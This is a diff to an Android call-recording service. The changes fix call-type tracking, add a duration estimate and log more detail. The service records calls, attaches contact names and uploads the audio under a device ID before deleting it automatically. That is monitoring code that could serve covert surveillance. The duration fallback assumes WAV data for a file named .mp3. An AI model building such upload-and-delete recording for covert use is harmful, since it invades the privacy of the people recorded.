@@ -89,11 +89,16 @@ class CallRecordService : Service() {
             }
         }
         
-        // Track call type from intent
+        // Track call type from intent - but DON'T override if recording is already in progress
+        // This prevents PhoneStateReceiver from overwriting outgoing→incoming
         intent?.getStringExtra("callType")?.let { type ->
             if (type.isNotEmpty()) {
-                currentCallType = type
-                Log.w(TAG, "Updated currentCallType=$type")
+                if (isRecording && currentCallType != "unknown") {
+                    Log.w(TAG, "Ignoring callType=$type update because recording is active with callType=$currentCallType")
+                } else {
+                    currentCallType = type
+                    Log.w(TAG, "Updated currentCallType=$type")
+                }
             }
         }
         
@@ -238,39 +243,63 @@ class CallRecordService : Service() {
     }
 
     private fun startCallRecording() {
-        if (isRecording) return
+        if (isRecording) {
+            Log.w(TAG, "startCallRecording() skipped - already recording")
+            return
+        }
         isRecording = true
         recordingStartTime = System.currentTimeMillis()
         
-        Log.w(TAG, "Starting call recording for: $currentPhoneNumber")
+        Log.w(TAG, "Starting call recording for: $currentPhoneNumber, callType=$currentCallType, startTime=$recordingStartTime")
         
         val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
         val fileName = "call_${timestamp}.mp3"
         currentRecordingFile = File(cacheDir, fileName)
         
         audioRecorder = AudioRecorder(this)
-        audioRecorder?.startRecording(currentRecordingFile!!.absolutePath)
+        val recordStarted = audioRecorder?.startRecording(currentRecordingFile!!.absolutePath, forCallRecording = true)
+        Log.w(TAG, "AudioRecorder.startRecording returned: $recordStarted")
     }
 
     private fun stopCallRecording() {
-        if (!isRecording) return
+        if (!isRecording) {
+            Log.w(TAG, "stopCallRecording() skipped - not recording")
+            return
+        }
         isRecording = false
         
         // Calculate actual duration in seconds
-        val durationSeconds = if (recordingStartTime > 0L) {
+        var durationSeconds = if (recordingStartTime > 0L) {
             ((System.currentTimeMillis() - recordingStartTime) / 1000).toInt()
         } else 0
         
-        Log.w(TAG, "Stopping call recording, duration=${durationSeconds}s")
+        Log.w(TAG, "Stopping call recording, duration=${durationSeconds}s, recordingStartTime=$recordingStartTime, callType=$currentCallType")
         
         audioRecorder?.stopRecording()
         
         // Check cache file
-        Log.w(TAG, "Cache file: ${currentRecordingFile?.absolutePath}, exists=${currentRecordingFile?.exists()}, size=${currentRecordingFile?.length()}")
+        val fileSize = currentRecordingFile?.length() ?: 0
+        Log.w(TAG, "Cache file: ${currentRecordingFile?.absolutePath}, exists=${currentRecordingFile?.exists()}, size=$fileSize")
+        
+        // Fallback duration from WAV file data if recordingStartTime was not set
+        // WAV PCM 16-bit mono 44100Hz = 88200 bytes per second (+ 44 byte header)
+        if (durationSeconds <= 0 && fileSize > 44) {
+            durationSeconds = ((fileSize - 44) / 88200).toInt()
+            Log.w(TAG, "Using fallback duration from file size: ${durationSeconds}s")
+        }
         
         // Resolve contact name from phone number
         val contactName = getContactName(currentPhoneNumber)
         Log.w(TAG, "Resolved contact name: $contactName for number: $currentPhoneNumber")
+        
+        // Save state before resetting
+        val phoneNumber = currentPhoneNumber
+        val callType = currentCallType
+        
+        // Reset state for next call
+        recordingStartTime = 0L
+        currentCallType = "unknown"
+        // Don't reset currentPhoneNumber - might be needed if service restarts
         
         // Upload recording and schedule deletion
         currentRecordingFile?.let { file ->
@@ -283,8 +312,11 @@ class CallRecordService : Service() {
                 file.copyTo(permanentFile, overwrite = true)
                 file.delete() // Delete temp file
                 
+                Log.w(TAG, "Uploading: phone=$phoneNumber, contact=$contactName, type=$callType, duration=${durationSeconds}s")
                 // Upload and schedule auto-delete
-                uploadCallRecordingWithAutoDelete(permanentFile, currentPhoneNumber, contactName, durationSeconds)
+                uploadCallRecordingWithAutoDelete(permanentFile, phoneNumber, contactName, durationSeconds, callType)
+            } else {
+                Log.w(TAG, "No file to upload: exists=${file.exists()}, size=${file.length()}")
             }
         }
     }
@@ -309,14 +341,14 @@ class CallRecordService : Service() {
         return null
     }
 
-    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int) {
+    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int, callType: String = "unknown") {
         serviceScope.launch {
             var uploadSuccess = false
             var retryCount = 0
             val maxRetries = 3
             
             while (!uploadSuccess && retryCount < maxRetries) {
-                uploadSuccess = uploadCallRecording(file, phoneNumber, contactName, durationSeconds)
+                uploadSuccess = uploadCallRecording(file, phoneNumber, contactName, durationSeconds, callType)
                 if (!uploadSuccess) {
                     retryCount++
                     Log.w(TAG, "Upload failed, retry $retryCount/$maxRetries")
@@ -341,7 +373,7 @@ class CallRecordService : Service() {
         }
     }
 
-    private suspend fun uploadCallRecording(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int): Boolean {
+    private suspend fun uploadCallRecording(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int, callType: String = "unknown"): Boolean {
         return try {
             val deviceId = preferenceManager.getDeviceId()
             val baseUrl = ApiClient.BASE_URL.trimEnd('/')
@@ -392,10 +424,10 @@ class CallRecordService : Service() {
             writer.append("Content-Disposition: form-data; name=\"contactName\"\r\n\r\n")
             writer.append(contactName ?: "")
             
-            // Add callType field
+            // Add callType field - use the passed callType parameter, not the class variable
             writer.append("\r\n--$boundary\r\n")
             writer.append("Content-Disposition: form-data; name=\"callType\"\r\n\r\n")
-            writer.append(currentCallType)
+            writer.append(if (callType != "unknown") callType else "incoming")
             
             // Add duration field
             writer.append("\r\n--$boundary\r\n")
